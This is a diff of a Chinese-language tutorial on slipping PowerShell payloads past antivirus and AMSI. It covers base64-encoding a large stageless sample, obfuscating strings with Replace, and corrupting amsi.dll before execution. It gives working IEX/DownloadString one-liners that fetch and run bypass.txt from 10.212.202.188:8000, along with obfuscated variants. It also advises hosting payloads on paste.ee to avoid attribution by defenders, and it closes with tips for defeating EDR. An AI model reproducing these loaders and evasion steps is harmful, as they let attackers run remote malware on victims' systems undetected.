@@ -137,6 +137,20 @@ HRESULT AmsiScanBuffer(
 
 # 0x02.分离免杀:抛弃 net webclient 远程加载方式（一）
 
+## 首先我们需要对远程托管的Powershell样本进行免杀处理，然后在客户端用PowerShell脚本命令去读取远程托管的样本，并用IEX执行
+
+## 这边用Stageless生成一个体积较大的powershell样本，因为样本是远程托管的，所以体积越大越好，这样混淆手法越丰富，发挥空间也越大就越难被检测出来（这边生成的体积大约是300-400Kb）
+![image](https://user-images.githubusercontent.com/89376703/155830293-e173c15f-da7e-468e-8614-bb5deff12f35.png)
+
+![image](https://user-images.githubusercontent.com/89376703/155830356-7b0bb5fb-7588-4520-802a-23d141a2f0f5.png)
+
+
+## 对样本进行base64加密并放入字符串变量，写好解密公式,尽可能用Replace函数去替换变量中字符串以此规避AMSI的字符串特征扫描
+![image](https://user-images.githubusercontent.com/89376703/155830759-189d52cf-8fe0-4187-9d79-59e096d61491.png)
+
+## 当然你还可以 加一些破坏amsi.dll的代码、进行异或加密解密或者是一些无用的混淆代码
+
+# 远程加载代码：抛弃net webclient的方式
 ## 这里采用.net中的webrequest去请求远程恶意样本内容、读取样本、并执行样本。其实加载原理都是用IEX去执行远程的样本内容，大同小异，这边只是修改了一些特征，这里执行的前提是远程加载的powershell样本也得免杀，我们通常会将样本放置在网页可以访问的web服务器上，但是这同时也带来了风险，因为有些高级防病毒软件会标记一些恶意的公网IP（比如说卡巴斯基、小红伞），如果你将样本托管GitHub，虽然虽不会被防病毒标记，但是在实战攻防中非常容易就被蓝队溯源出个人信息，这边推荐一个可以在公网上挂起文本并且合法的网站https://paste.ee/  
 
 
@@ -155,7 +169,7 @@ IEX($content)
 ![image](https://user-images.githubusercontent.com/89376703/155734700-cc2a1aa8-9f42-4744-9e3f-842d0687347c.png)
 
 ## 当然有IEX的地方amsi.dll肯定会重点扫描，你必须在IEX执行之前就破坏它，因此这里可以在$content=$reader.ReadToEnd()和IEX($content)插入破坏amsi.dll的代码。
-
+## 注意:(这里远程托管的PowerShell样本必须免杀AMSI，否则加载后一分钟左右会报毒)
 ![image](https://user-images.githubusercontent.com/89376703/155734863-2274eb70-a3ca-4000-bd89-bbce4eab3949.png)
 
 
@@ -163,11 +177,13 @@ IEX($content)
 
 # 0x03.远程加载方式（二）
 
+
+
 ```
 IEX ((new-object net.webclient).downloadstring('http://0.0.0.0:8000/bypass.txt'.))
 ```
 
-同样的我们可以通过Replace函数去替换字符串来混淆IP地址（远程托管的powershell样本必须免杀）
+## 同样的我们可以通过Replace函数去替换字符串来混淆IP地址
 
 ```
 IEX ((new-object net.webclient).downloadstring("http://10.@!#$%^&*()21@!#$%^&*()2.202.188@@@@@:8000/byp**************ass.tx**************t".Replace('@@@@@','').Replace('@!#$%^&*()','').Replace('**************',''))
@@ -182,12 +198,18 @@ IEX ((new-object net.webclient).downloadstring("http://10.@!#$%^&*()21@!#$%^&*()
 IEX([Net.Webclient]::new().DownloadString("http://0.0.0.0:8000/bypass.txt".))
 ```
 
-# 这个方法和方式二类似，本质上还是用webclient去连接服务端的方式进行通信
+## 这个方法和方式二类似，本质上还是用webclient去连接服务端的方式进行通信
 
-# 混淆后的样本为
+## 混淆后的样本为
 
 ```
 IEX([Net.Webclient]::new().DownloadString("h%%%t%%%tp:%%%//10.212.2@@@@@02.188@@@@@:80@@@@@00/bypas%%%s.tx%%%t".Replace('@@@@@','').Replace('%%%','')))
 ```
 
 ![image](https://user-images.githubusercontent.com/89376703/155734999-eda34e45-42c7-4e2b-a526-c4eae7cb183f.png)
+
+# 绕过思路总结
+## 1.破坏反病毒的扫描进程或者劫持amsi.dll都可以有效地去绕过AMSI，其次，amsi.dll可以用WinDbg等软件进行调试，可用于逆向工程、反汇编和动态分析。在我们的例子中，WinDbg 将附加到运行 PowerShell 的进程，以分析 AMSI。
+## 2.使用IEX和webclient远程加载powershell进程，虽然方式比较简单，但是进程容易被杀死，cs执行高危操作会马上掉线。当进程被挂钩的同时，想绕过更多的防病毒软件和EDR会变得困难。
+## 3.0x02的记载方式显然比较稳定，比起webclient
+
